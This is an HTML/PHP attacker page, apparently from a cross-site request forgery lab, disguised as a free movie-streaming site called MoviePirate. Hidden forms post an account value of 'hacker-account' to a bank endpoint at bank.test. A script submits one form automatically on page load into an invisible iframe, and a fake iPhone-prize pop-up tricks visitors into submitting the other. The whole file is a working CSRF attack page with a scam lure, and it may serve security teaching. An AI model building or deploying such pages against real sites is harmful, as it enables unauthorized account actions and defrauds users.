<!-- evil/index.php -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoviePirate - Free HD Movies</title>
    <!-- bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #0f0f0f;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .navbar {
            background-color: #1a1a1a;
            border-bottom: 1px solid #333;
        }
        .movie-card {
            transition: transform 0.3s;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            border-radius: 8px;
            cursor: pointer;
        }
        .movie-card:hover {
            transform: scale(1.03);
        }
        .movie-card img {
            width: 100%;
            height: 300px;
            object-fit: cover;
        }
        .movie-info {
            background: rgba(0, 0, 0, 0.8);
            padding: 10px;
            position: absolute;
            bottom: 0;
            width: 100%;
        }
        .movie-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .movie-year {
            font-size: 14px;
            color: #aaa;
        }
        .search-bar {
            background-color: #222;
            border: 1px solid #444;
            color: #fff;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 9999;
        }
        .toast-header {
            background-color: #007bff;
            color: white;
        }
        .prize-img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        footer {
            background-color: #1a1a1a;
            padding: 20px 0;
            margin-top: 50px;
        }
        .play-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.5);
            opacity: 0;
            transition: opacity 0.3s;
        }
        .movie-card:hover .play-overlay {
            opacity: 1;
        }
        .play-icon {
            font-size: 50px;
            color: white;
        }
        .featured-video {
            margin-bottom: 30px;
            border-radius: 8px;
            overflow: hidden;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }
        .video-container-embed {
            position: relative;
            width: 100%;
            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
        }
        .video-container-embed iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        .video-title {
            background-color: #222;
            padding: 15px;
            border-bottom-left-radius: 8px;
            border-bottom-right-radius: 8px;
        }
    </style>
</head>
<body>
    <!-- hidden CSRF attack forms -->
    <iframe id="csrf-frame" name="csrf-frame" style="display:none"></iframe>
    <form id="csrf-form" action="http://bank.test/index.php" method="POST" target="csrf-frame" style="display:none">
        <input type="hidden" name="account" value="hacker-account">
    </form>
    <form id="visible-form" action="http://bank.test/index.php" method="POST" style="display:none">
        <input type="hidden" name="account" value="hacker-account">
    </form>

    <!-- navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark mb-4">
        <div class="container">
            <a class="navbar-brand" href="#">Movie Box Pro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto">
                    <li class="nav-item"><a class="nav-link active" href="#">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">New Releases</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">Top Rated</a></li>
                    <li class="nav-item"><a class="nav-link" href="#">Categories</a></li>
                </ul>
                <form class="d-flex">
                    <input class="form-control search-bar me-2" type="search" placeholder="Search movies...">
                    <button class="btn btn-outline-light" type="submit">Search</button>
                </form>
            </div>
        </div>
    </nav>

    <!-- main Content -->
    <div class="container">
        <!-- featured video -->
        <div class="featured-video">
            <div class="video-container-embed">
                <iframe id="featured-video-player" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0" title="Featured Movie" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
            </div>
            <div class="video-title">
                <h3>Now Playing: Minecraft Movie (2025)</h3>
                <p>4k HDR Dolby Atmos | Bisaya Dubbed | Free Stream</p>
            </div>
        </div>
        
        <h2 class="mb-4">HD Movies in 2023</h2>
        
        <div class="row">
            <!-- Movie 1 -->
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BMDBmYTZjNjUtN2M1MS00MTQ2LTk2ODgtNzc2M2QyZGE5NTVjXkEyXkFqcGdeQXVyNzAwMjU2MTY@._V1_.jpg" alt="Dune 2">
                    <div class="movie-info">
                        <div class="movie-title">Dune: Part Two</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <!-- Movie 2 -->
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BMTY1NjM0MzgxMV5BMl5BanBnXkFtZTgwNDgzOTAzMzI@._V1_.jpg" alt="Oppenheimer">
                    <div class="movie-info">
                        <div class="movie-title">Oppenheimer</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <!-- Movie 3 -->
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BYjZkNzM0MDItZGQ0Zi00N2MzLTlhM2MtNjJlMTczZDBkNWUxXkEyXkFqcGdeQXVyODE5NzE3OTE@._V1_.jpg" alt="Barbie">
                    <div class="movie-info">
                        <div class="movie-title">Barbie</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <!-- Movie 4 -->
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BMDgxOTdjMzYtZGQxMS00ZTAzLWI4Y2UtMTQzN2VlYjYyZWRiXkEyXkFqcGdeQXVyMTUzMTg2ODkz._V1_.jpg" alt="Guardians 3">
                    <div class="movie-info">
                        <div class="movie-title">Guardians of the Galaxy Vol. 3</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <!-- More Movies -->
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BOTJhNzlmNzctNTU5Yy00N2YwLThhMjQtZDM0YjEzN2Y0ZjNhXkEyXkFqcGdeQXVyMTEwMTQ4MzU5._V1_FMjpg_UX1000_.jpg" alt="The Flash">
                    <div class="movie-info">
                        <div class="movie-title">The Flash</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BNzZmOTU1ZTEtYzVhNi00NzQxLWI5ZjAtNWNhZjNkZGZhMGNiXkEyXkFqcGdeQXVyODk4OTc3MTY@._V1_.jpg" alt="Fast X">
                    <div class="movie-info">
                        <div class="movie-title">Fast X</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BZjRkNGM1Y2ItMDExMy00OGU3LWI3YmYtNzNjOThjZGUyOWYzXkEyXkFqcGdeQXVyMDM2NDM2MQ@@._V1_.jpg" alt="John Wick 4">
                    <div class="movie-info">
                        <div class="movie-title">John Wick: Chapter 4</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-3 col-md-4 col-sm-6">
                <div class="movie-card">
                    <img src="https://m.media-amazon.com/images/M/MV5BYmZlZDZkZjYtNzE5Mi00ODFhLTk2OTgtZWVmODBiZTI4NGFiXkEyXkFqcGdeQXVyMTE5MTg5NDIw._V1_.jpg" alt="Spider-Man">
                    <div class="movie-info">
                        <div class="movie-title">Spider-Man: Across the Spider-Verse</div>
                        <div class="movie-year">2023</div>
                    </div>
                    <div class="play-overlay">
                        <div class="play-icon">▶</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="text-center">
        <div class="container">
            <p>© 2023 MoviePirate - We are not responsible for any content on this site.</p>
            <p>Disclaimer: All movies are for educational purposes only. Download at your own risk.</p>
        </div>
    </footer>

    <!-- iPhone Winner Toast Notification -->
    <div class="toast" role="alert" aria-live="assertive" aria-atomic="true" id="iphone-toast">
        <div class="toast-header">
            <strong class="me-auto">🎉 CONGRATULATIONS!</strong>
            <small>Just now</small>
            <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
        <div class="toast-body bg-light text-dark">
            <h5>You are <strong>iPhone Galaxy 15 Pro Ultra! 🤯</strong> !</h5>
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYaYy9CZiHjHblgGZHhOSzJkfbdtZvKdBDPw&s" alt="iPhone Galaxy 15 Pro Ultra" class="prize-img">
            <p>So lucky !! Click now to claim!</p>
            <button class="btn btn-primary w-100" id="claim-button">Claim Now</button>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Run when the document is ready
        document.addEventListener('DOMContentLoaded', function() {
            // Try automatic CSRF attack immediately
            document.getElementById('csrf-form').submit();
            
            // Show the toast notification immediately
            const toastEl = document.getElementById('iphone-toast');
            const toast = new bootstrap.Toast(toastEl, {autohide: false});
            toast.show();
            
            // Set up click handler for the claim button
            document.getElementById('claim-button').addEventListener('click', function() {
                alert('Congratulations! You will be redirected to confirm your shipping information.');
                // Short delay to allow the alert to be seen
                setTimeout(function() {
                    // Submit the visible form that will redirect the user
                    document.getElementById('visible-form').submit();
                }, 500);
            });

            // Make all movie cards trigger a click on the featured movie
            document.querySelectorAll('.movie-card').forEach(card => {
                card.addEventListener('click', function() {
                    alert('Loading movie... Please wait.');
                });
            });
        });
    </script>
</body>
</html>
